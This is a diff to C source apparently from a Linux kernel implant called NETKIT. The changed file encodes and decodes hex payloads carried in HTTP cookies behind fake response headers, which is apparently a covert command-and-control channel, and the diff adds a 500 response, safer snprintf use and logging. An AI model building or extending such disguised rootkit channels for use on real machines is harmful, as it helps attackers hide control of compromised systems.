@@ -14,8 +14,9 @@
 
 #define HTTP_STAT_OK_NAME "200 OK"
 #define HTTP_STAT_UNPROC_NAME "422 Unprocessable Content"
+#define HTTP_STAT_INTLERR_NAME "500 Internal Server Error"
 
-#define HTTP_PROTO "HTTP/2"
+#define HTTP_PROTO "HTTP/1.1"
 #define HTTP_FAKE_HEADERS "Vary: origin\r\n" \
                         "Access-Control-Allow-Credentials: true\r\n" \
                         "Access-Control-Allow-Methods: GET\r\n" \
@@ -34,10 +35,12 @@
 
 #define HTTP_RES_OK HTTP_RES(HTTP_STAT_OK_NAME, HTTP_COOKIE_HDR)
 #define HTTP_RES_UNPROC HTTP_RES(HTTP_STAT_UNPROC_NAME, "")
+#define HTTP_RES_INTLERR HTTP_RES(HTTP_STAT_INTLERR_NAME, "")
 
 enum {
     HTTP_STAT_OK = 200,
-    HTTP_STAT_UNPROC = 422
+    HTTP_STAT_UNPROC = 422,
+    HTTP_STAT_INTLERR = 500
 };
 
 // basically greps for SEARCH_STRING and does hex decode()
@@ -59,12 +62,11 @@ static int enc_http_decode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, s
     return hex_decode(cookie_start, cookie_size, res_buf, res_buflen);
 }
 
-// should resolve at compile time
-static int set_http_unproc(u8 **res_buf, size_t *res_buflen)
+static int set_http_simple(const char *res_content, u8 **res_buf, size_t *res_buflen)
 {
     int retv;
 
-    *res_buflen = strlen(HTTP_RES_UNPROC);
+    *res_buflen = strlen(res_content);
     *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
     if (IS_ERR(*res_buf))
     {
@@ -74,7 +76,7 @@ static int set_http_unproc(u8 **res_buf, size_t *res_buflen)
         return retv;
     }
 
-    memcpy(*res_buf, HTTP_RES_UNPROC, *res_buflen);
+    memcpy(*res_buf, res_content, *res_buflen);
 
     return 0;
 }
@@ -88,18 +90,18 @@ static int set_http_ok(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_
     retv = hex_encode(req_buf, req_buflen, &encoded_buf, &encoded_buflen);
     if (retv < 0)
         goto LAB_ERR_NO_RES_BUF;
-    
+
     *res_buflen = strlen(HTTP_RES_OK) - 4 + encoded_buflen + 1;
     *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
     if (IS_ERR(*res_buf))
         goto LAB_ERR_NO_RES_BUF;
 
-    retv = sprintf(*res_buf, HTTP_RES_OK, (int)encoded_buflen, encoded_buf);
+    retv = snprintf(*res_buf, *res_buflen, HTTP_RES_OK, (int)encoded_buflen, encoded_buf);
     kzfree(encoded_buf, encoded_buflen);
-    if (retv != 2)
+    if (retv != *res_buflen - 1) // nullbyte
         goto LAB_ERR; // will not send internal server error due to complexity    
     
-    (*res_buf)[*res_buflen-1] = '\n'; // fix sprintf not supporting no NB at end
+    (*res_buf)[*res_buflen-1] = '\n';
 
     return 0;
 
@@ -109,7 +111,8 @@ LAB_ERR_NO_RES_BUF:
     *res_buf = NULL;
     *res_buflen = 0;
 
-    return set_http_unproc(res_buf, res_buflen);
+    NETKIT_LOG("[-] http encode failed. switching to unprocessable\n");
+    return set_http_simple(HTTP_RES_UNPROC, res_buf, res_buflen);
 }
 
 static int enc_http_encode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen, unsigned int status_code)
@@ -119,7 +122,9 @@ static int enc_http_encode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, s
         case HTTP_STAT_OK:
             return set_http_ok(req_buf, req_buflen, res_buf, res_buflen);
         case HTTP_STAT_UNPROC:
-            return set_http_unproc(res_buf, res_buflen);
+            return set_http_simple(HTTP_RES_UNPROC, res_buf, res_buflen);
+        case HTTP_STAT_INTLERR:
+            return set_http_simple(HTTP_RES_INTLERR, res_buf, res_buflen);
         default:
             return -EINVAL;
     }
@@ -136,6 +141,7 @@ int enc_http_process(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t 
     retv = enc_http_decode(req_buf, req_buflen, &decoded_buf, &decoded_buflen);
     if (retv < 0)
     {
+        NETKIT_LOG("[-] http decode failed\n");
         enc_http_encode(NULL, 0, res_buf, res_buflen, HTTP_STAT_UNPROC);
         return retv;
     }
